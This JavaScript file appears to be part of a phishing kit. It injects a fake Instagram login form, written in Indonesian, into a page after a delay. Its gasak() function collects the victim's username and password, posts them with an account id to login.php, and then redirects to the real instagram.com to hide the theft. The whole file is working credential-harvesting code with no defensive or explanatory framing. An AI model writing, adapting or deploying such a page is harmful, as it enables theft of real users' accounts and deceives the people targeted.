

function stateChange() {
    setTimeout(function () {
        var data = "<div class='card'> <div class='card-header' align='center'> Login untuk melanjutkan </div> <div class='card-body' align='center'> <img width='40%' src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png'> <button class='btn btn-primary'><i class='fa-brands fa-square-facebook'></i> Lanjutkan dengan Facebook</button> <div class='container' align='left'> <br> <label>Username</label> <input id='id1' class='form-control' placeholder='Masukan username, email, atau nomor telpon'> <label>Password</label> <input id='id2' type='password' class='form-control' placeholder='Kata Sandi'> <br> <div align='right'> <a href='#'>Lupa kata sandi?</a> </div><br> <button onclick='gasak()' style='width:100%;' class='btn btn-primary'>Login</button> </div><br> <p>Tidak punya akun? <a href='#'>Buat akun</a></p> </div> </div> <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css' integrity='sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A==' crossorigin='anonymous' referrerpolicy='no-referrer' />";



var utama = document.getElementById("utama");
utama.innerHTML = data;
    }, 3000);
}


function redir() {
    setTimeout(function () {
     window.location.replace("http://instagram.com");
    }, 2000);
}

stateChange();
function gasak(){
    var username = document.getElementById("id1").value;
    var password = document.getElementById("id2").value;
    
    
    if (username.length > 0){
        if (password.length > 0){
            
            console.log(username);
            console.log(password);
            
            
            $.post("login.php",
            {
                username: username,
                password: password,
                id_account: id_account,
                type: type
            },
            function(data,status){
                redir();
            });
            
            
        }
        else{
            alert("Silahkan masukan password dengan benar");
        }
    }
    else{
        alert("Silahkan masukan username")
    }
}


